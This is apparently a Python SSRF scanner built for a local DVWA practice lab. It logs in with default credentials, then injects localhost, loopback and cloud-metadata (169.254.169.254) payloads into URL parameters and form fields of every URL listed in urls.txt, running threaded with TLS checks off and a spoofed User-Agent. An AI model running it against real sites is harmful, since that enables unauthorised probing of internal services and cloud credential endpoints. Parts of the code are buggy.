import requests
import threading
import time
import warnings
from bs4 import BeautifulSoup
from urllib.parse import urljoin
from colorama import Fore

# Function to login to DVWA
def login_dvwa(session, url, username, password):
    login_url = urljoin(url, 'login.php')
    login_data = {
        'username': username,
        'password': password,
        'Login': 'Login'
    }
    session.post(login_url, data=login_data)

def get_all_forms(url):
    r = s.get(url)
    soup = BeautifulSoup(r.content, "lxml")
    return soup.find_all("form")

def get_details(form):
    details = {}
    try:
        act = form.attrs.get("action").lower()
    except:
        act = None

    method = form.attrs.get("method", "get").lower()
    
    inputs = []
    for tag in form.find_all("input"):
        input_type = tag.attrs.get("type", "text")
        input_value = tag.attrs.get("value", "")
        input_name = tag.attrs.get("name")
        inputs.append({"type": input_type, "value": input_value, "name": input_name})
    details["method"] = method
    details["action"] = act
    details["inputs"] = inputs
    return details

def is_vuln(response):
    indicators = {
        "internal",
        "localhost",
        "169.254.",
        "0.0.0.0",
        "127.0.0.1"
    }
    try:
        for indicator in indicators:
            if indicator in response.text.lower():
                return True
        return False
    except UnicodeDecodeError:
        return False
    except requests.exceptions.RequestException:
        pass

def scan_ssrf(url):
    f = open("vuln.txt", "a+")
    try:
        payloads = ["http://localhost", "http://127.0.0.1", "http://169.254.169.254"]
        for payload in payloads:
            new_url = f"{url}?url={payload}"
            print(f"{Fore.WHITE}[CONSOLE] Trying: {new_url}")
            r = s.get(new_url)
            if is_vuln(r):
                print(f"{Fore.GREEN}[CONSOLE] Found SSRF vulnerability! " + new_url)
                f.write(new_url + "\n")
                f.close()
                return
    except requests.exceptions.RequestException:
        pass

    try:
        forms = get_all_forms(url)
        print(f"{Fore.CYAN}[CONSOLE] Detected {len(forms)} forms on {url}")
        for form in forms:
            form_details = get_details(form)
            for payload in payloads:
                data = {}
                for tag in form_details['inputs']:
                    if tag["type"] == "hidden" or tag["value"]:
                        try:
                            data[tag["name"]] = payload
                        except:
                            pass
                    elif tag["type"] != "submit":
                        data[tag["name"]] = f"test{payload}"
                    url = urljoin(url, form_details["action"])
                    if form_details["method"] == "post":
                        r = s.post(url, data=data)
                    elif form_details["method"] == "get":
                        r = s.get(url, params=data)

                    if is_vuln(r):
                        f.write(url + "\n")
                        print(f"{Fore.GREEN}[CONSOLE] Found SSRF vulnerability! " + url)
                        return
                    else:
                        pass
        f.close()
    except requests.exceptions.RequestException:
        pass

def start_scan():
    global checked
    try:
        threads = []
        with open('urls.txt', 'r') as f:
            R = f.readlines()
            for _ in range(thr):
                if checked < len(R):
                    for url in R:
                        time.sleep(delay)
                        t = threading.Thread(target=scan_ssrf, args=(url.strip(),))
                        t.start()
                        checked += 1
                        threads.append(t)

                    for t in threads:
                        t.join()
        f.close()
    except FileNotFoundError:
        print(f"{Fore.RED}[CONSOLE] please create one, and add the url/s to it.")
    except requests.exceptions.RequestException:
        pass    

def start_ssrf_():
    global thr, delay, checked, s
    warnings.filterwarnings('ignore', message='Unverified HTTPS request')

    s = requests.Session()
    s.headers["User-Agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.66 Safari/537.36"

    # Disable SSL verification warnings
    s.verify = False

    # Login to DVWA
    dvwa_url = 'http://127.0.0.1:42001/'
    dvwa_username = 'admin'
    dvwa_password = 'password'
    login_dvwa(s, dvwa_url, dvwa_username, dvwa_password)

    thr = 10  # Set number of threads
    delay = 0  # Set delay between requests

    checked = 0
    start_scan()

# Start the SSRF scan process
start_ssrf_()
